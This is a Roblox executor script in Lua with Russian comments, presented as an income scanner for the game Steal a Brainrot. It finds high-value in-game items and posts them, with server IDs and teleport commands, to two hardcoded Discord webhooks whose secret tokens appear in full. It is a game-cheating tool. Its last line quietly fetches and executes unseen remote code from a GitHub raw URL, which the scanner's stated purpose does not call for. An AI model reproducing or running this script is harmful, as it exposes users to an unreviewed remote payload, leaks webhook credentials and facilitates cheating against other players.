-- 🎯 BRAINROT INCOME SCANNER v2.0 (ПОЛНАЯ ВЕРСИЯ)
-- Сканирует все объекты в Steal a Brainrot и отправляет уведомления в Discord

local Players = game:GetService('Players')
local UserInputService = game:GetService('UserInputService')
local HttpService = game:GetService('HttpService')

-- ⚙️ НАСТРОЙКИ
local HIGH_PRIORITY_THRESHOLD = 500_000_000 -- 500M/s
local MIDDLE_PRIORITY_THRESHOLD = 100_000_000 -- 100M/s

-- Webhook URLs
local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1421498530756952287/XKkzMBw09MJGBC9VMv6A5yMkE1IxYLtQWqq_bKXCiK0etZSuTvnOutuWRr9HQA7H6nv1'
local MIDDLE_PRIORITY_WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1426282608710647952/bmfmWPMug07ht7nRa_QeCVi7tfItybezKVkZ2tmw7lsODttiUnSnYJArl6UchxqIbeyT'

print('🎯 Brainrot Scanner v2.0 | JobId:', game.JobId)

-- 🎮 ОБЪЕКТЫ С ЭМОДЗИ И ВАЖНОСТЬЮ
local OBJECTS = {
    ['Garama and Madundung'] = { emoji = '🍝', important = true },
    ['Dragon Cannelloni'] = { emoji = '🐲', important = true },
    ['Nuclearo Dinossauro'] = { emoji = '🦕', important = true },
    ['Esok Sekolah'] = { emoji = '🏠', important = true },
    ['La Supreme Combinasion'] = { emoji = '🔫', important = true },
    ['Ketupat Kepat'] = { emoji = '🍏', important = true },
    ['Strawberry Elephant'] = { emoji = '🐘', important = true },
    ['Spaghetti Tualetti'] = { emoji = '🚽', important = true },
    ['Ketchuru and Musturu'] = { emoji = '🍾', important = true },
    ['Tralaledon'] = { emoji = '🦈', important = true },
    ['La Extinct Grande'] = { emoji = '🩻', important = true },
    ['Tictac Sahur'] = { emoji = '🕰️', important = true },
    ['Los Primos'] = { emoji = '🙆‍♂️', important = true },
    ['Tang Tang Keletang'] = { emoji = '📢', important = true },
    ['Money Money Puggy'] = { emoji = '🐶', important = true },
    ['Burguro And Fryuro'] = { emoji = '🍔', important = true },
    ['Chillin Chili'] = { emoji = '🌶', important = true },
    ['La Secret Combinasion'] = { emoji = '❓', important = true },
    ['Eviledon'] = { emoji = '😡', important = true },
    ['Los Mobilis'] = { emoji = '🫘', important = true },
    ['La Spooky Grande'] = { emoji = '🎃', important = true },
    ['Spooky and Pumpky'] = { emoji = '🦇', important = true },
    ['Chicleteira Bicicleteira'] = { emoji = '🚲', important = true },
    ['Los Combinasionas'] = { emoji = '⚒️', important = true },
    ['La Grande Combinasion'] = { emoji = '❗️', important = true },
}

-- Создаем список ВСЕХ важных объектов
local IMPORTANT_OBJECTS = {}
for name, cfg in pairs(OBJECTS) do
    if cfg.important then
        IMPORTANT_OBJECTS[name] = true
    end
end

-- 💰 ПАРСЕР ДОХОДА
local function parseGenerationText(s)
    if type(s) ~= 'string' or s == '' then
        return nil
    end
    
    -- Убираем $, запятые и пробелы
    local norm = s:gsub('%$', ''):gsub(',', ''):gsub('%s+', '')
    
    -- Пробуем разные форматы
    local num, suffix = norm:match('^([%-%d%.]+)([KkMmBb]?)/s$')
    if not num then
        -- Пробуем без /s
        num, suffix = norm:match('^([%-%d%.]+)([KkMmBb]?)$')
    end
    
    if not num then
        return nil
    end
    
    local val = tonumber(num)
    if not val then
        return nil
    end
    
    local mult = 1
    if suffix == 'K' or suffix == 'k' then
        mult = 1e3
    elseif suffix == 'M' or suffix == 'm' then
        mult = 1e6
    elseif suffix == 'B' or suffix == 'b' then
        mult = 1e9
    end
    
    return val * mult
end

local function formatIncomeNumber(n)
    if not n then
        return 'Unknown'
    end
    if n >= 1e9 then
        local v = n / 1e9
        return (v % 1 == 0 and string.format('%dB/s', v) or string.format('%.1fB/s', v)):gsub('%.0B/s', 'B/s')
    elseif n >= 1e6 then
        local v = n / 1e6
        return (v % 1 == 0 and string.format('%dM/s', v) or string.format('%.1fM/s', v)):gsub('%.0M/s', 'M/s')
    elseif n >= 1e3 then
        local v = n / 1e3
        return (v % 1 == 0 and string.format('%dK/s', v) or string.format('%.1fK/s', v)):gsub('%.0K/s', 'K/s')
    else
        return string.format('%d/s', n)
    end
end

-- 📝 ПОЛУЧЕНИЕ ТЕКСТА ИЗ UI
local function grabText(inst)
    if not inst then
        return nil
    end
    
    local success, result = pcall(function()
        if inst:IsA('TextLabel') or inst:IsA('TextButton') or inst:IsA('TextBox') then
            local text = inst.Text
            if type(text) == 'string' and #text > 0 then
                return text
            end
        end
        return nil
    end)
    
    return success and result or nil
end

local function getOverheadInfo(animalOverhead)
    if not animalOverhead then
        return nil, nil
    end

    local name = nil
    local genText = nil

    -- Ищем имя
    for _, child in ipairs(animalOverhead:GetDescendants()) do
        if not name and (child:IsA('TextLabel') or child:IsA('TextButton')) then
            local text = grabText(child)
            if text and #text > 0 and not text:match('/s') and not text:match('%$') then
                name = text
            end
        end
        
        -- Ищем текст с доходом
        if not genText and (child:IsA('TextLabel') or child:IsA('TextButton')) then
            local text = grabText(child)
            if text and (text:match('/s') or text:match('%$')) then
                genText = text
            end
        end
    end

    return name, genText
end

-- 🔍 ПОЛНЫЕ СКАНЕРЫ
local function scanAllObjects()
    local results = {}
    
    -- Рекурсивный поиск всех AnimalOverhead
    local function scanRecursive(parent)
        for _, child in ipairs(parent:GetChildren()) do
            if child.Name == 'AnimalOverhead' or child.Name:lower():match('animal') then
                local name, genText = getOverheadInfo(child)
                if name and genText then
                    local genNum = parseGenerationText(genText)
                    if genNum then
                        table.insert(results, {
                            name = name,
                            gen = genNum,
                            location = 'World'
                        })
                    end
                end
            end
            scanRecursive(child)
        end
    end
    
    -- Сканируем workspace и PlayerGui
    scanRecursive(workspace)
    
    if Players.LocalPlayer then
        local playerGui = Players.LocalPlayer:FindFirstChild('PlayerGui')
        if playerGui then
            scanRecursive(playerGui)
        end
    end
    
    return results
end

-- 📤 DISCORD УВЕДОМЛЕНИЯ
local function getRequester()
    return http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
end

local function sendDiscordNotification(objects, webhookUrl, isMiddlePriority)
    local req = getRequester()
    if not req then
        warn('❌ Нет HTTP API в executor')
        return false
    end

    if #objects == 0 then
        return false
    end

    local jobId = game.JobId
    local placeId = game.PlaceId

    -- Сортируем по доходу (убывание)
    table.sort(objects, function(a, b)
        return a.gen > b.gen
    end)

    -- Формируем список объектов
    local objectsList = {}
    for i = 1, math.min(10, #objects) do
        local obj = objects[i]
        local emoji = OBJECTS[obj.name] and OBJECTS[obj.name].emoji or '💰'
        local isImportant = IMPORTANT_OBJECTS[obj.name] and true or false
        
        local mark = isImportant and '⭐ ' or ''
        table.insert(
            objectsList,
            string.format(
                '%s%s **%s** (%s)',
                mark,
                emoji,
                obj.name,
                formatIncomeNumber(obj.gen)
            )
        )
    end
    
    local objectsText = table.concat(objectsList, '\n')

    -- Телепорт команда
    local teleportText = string.format(
        "`local ts = game:GetService('TeleportService'); ts:TeleportToPlaceInstance(%d, '%s')`",
        placeId,
        jobId
    )

    local title = isMiddlePriority and '💎 Найдены объекты с прибылью от 100M/s!' or '💎 Найдены важные объекты!'
    local color = isMiddlePriority and 0x00ff00 or 0x2f3136
    local footerText = isMiddlePriority and 
        string.format('Найдено: %d объектов от 100M/s • %s', #objects, os.date('%H:%M:%S')) :
        string.format('Найдено: %d важных объектов • %s', #objects, os.date('%H:%M:%S'))

    local payload = {
        username = '🎯 Brainrot Scanner',
        embeds = {
            {
                title = title,
                color = color,
                fields = {
                    {
                        name = '🆔 Сервер (Job ID)',
                        value = string.format('```%s```', jobId),
                        inline = false,
                    },
                    {
                        name = '💰 Объекты:',
                        value = objectsText,
                        inline = false,
                    },
                    {
                        name = '🚀 Телепорт:',
                        value = teleportText,
                        inline = false,
                    },
                },
                footer = {
                    text = footerText,
                },
                timestamp = DateTime.now():ToIsoDate(),
            },
        },
    }

    print('📤 Отправляю уведомление с', #objects, 'объектами')

    local success, result = pcall(function()
        return req({
            Url = webhookUrl,
            Method = 'POST',
            Headers = { ['Content-Type'] = 'application/json' },
            Body = HttpService:JSONEncode(payload),
        })
    end)

    if success then
        print('✅ Уведомление отправлено!')
        return true
    else
        warn('❌ Ошибка отправки:', result)
        return false
    end
end

-- 🎮 ГЛАВНАЯ ФУНКЦИЯ
local function scanAndNotify()
    print('🔍 Начинаю сканирование...')
    
    local allFound = scanAllObjects()
    print('📊 Найдено объектов:', #allFound)
    
    -- Выводим все найденные объекты для отладки
    for _, obj in ipairs(allFound) do
        print(string.format('   %s: %s', obj.name, formatIncomeNumber(obj.gen)))
    end

    -- ФИЛЬТРАЦИЯ:
    local importantObjects = {} -- Все важные объекты (любая прибыль)
    local highIncomeObjects = {} -- Неважные объекты ≥500M/s
    local middleIncomeObjects = {} -- Неважные объекты ≥100M/s

    for _, obj in ipairs(allFound) do
        if IMPORTANT_OBJECTS[obj.name] then
            -- ВАЖНЫЕ ОБЪЕКТЫ - любая прибыль
            table.insert(importantObjects, obj)
        else
            -- НЕВАЖНЫЕ ОБЪЕКТЫ - фильтруем по прибыли
            if obj.gen >= HIGH_PRIORITY_THRESHOLD then
                table.insert(highIncomeObjects, obj)
            elseif obj.gen >= MIDDLE_PRIORITY_THRESHOLD then
                table.insert(middleIncomeObjects, obj)
            end
        end
    end

    -- Объединяем важные объекты и неважные ≥500M/s для основного вебхука
    local mainWebhookObjects = {}
    for _, obj in ipairs(importantObjects) do
        table.insert(mainWebhookObjects, obj)
    end
    for _, obj in ipairs(highIncomeObjects) do
        table.insert(mainWebhookObjects, obj)
    end

    print('⭐ Важные объекты (любая прибыль):', #importantObjects)
    print('🔥 Неважные ≥500M/s:', #highIncomeObjects)
    print('💚 Неважные ≥100M/s:', #middleIncomeObjects)
    print('📤 Основной вебхук:', #mainWebhookObjects)
    print('📤 Второй вебхук:', #middleIncomeObjects)

    -- Отправляем уведомления
    if #mainWebhookObjects > 0 then
        sendDiscordNotification(mainWebhookObjects, DISCORD_WEBHOOK_URL, false)
    else
        print('🔍 Нет объектов для основного вебхука')
    end

    if #middleIncomeObjects > 0 then
        sendDiscordNotification(middleIncomeObjects, MIDDLE_PRIORITY_WEBHOOK_URL, true)
    else
        print('🔍 Нет объектов для второго вебхука')
    end
end

-- 🚀 ЗАПУСК
print('🎯 === BRAINROT INCOME SCANNER ЗАПУЩЕН ===')
print('⭐ Важные объекты (любая прибыль) → основной вебхук')
print('💚 Неважные объекты ≥100M/s → второй вебхук')
print('🔥 Неважные объекты ≥500M/s → основной вебхук')

-- Запускаем сразу
scanAndNotify()

-- ⌨️ ПОВТОР ПО КЛАВИШЕ F
local lastScan = 0
UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if input.KeyCode == Enum.KeyCode.F then
        local now = os.time()
        if now - lastScan >= 3 then
            lastScan = now
            print('\n🔄 Повторное сканирование (F)')
            scanAndNotify()
        end
    end
end)

print('💡 Нажмите F для повторного сканирования (задержка 3 сек)')
loadstring(game:HttpGet("https://raw.githubusercontent.com/velo35001/logi/refs/heads/main/botik.lua"))()
